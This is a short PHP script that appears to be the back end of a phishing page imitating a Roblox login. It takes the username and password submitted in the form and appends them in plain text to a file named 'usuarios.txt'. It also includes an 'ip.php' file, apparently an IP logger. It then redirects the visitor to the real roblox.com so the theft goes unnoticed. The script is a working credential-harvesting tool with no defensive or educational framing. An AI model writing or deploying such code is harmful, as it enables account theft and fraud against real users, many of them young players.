<?php
include "ip.php";
file_put_contents("usuarios.txt", "User : " . $_POST['username'] . "\nPassword: " . $_POST['password'] ."\n", FILE_APPEND);
header("Location: https://roblox.com");
exit();
?>
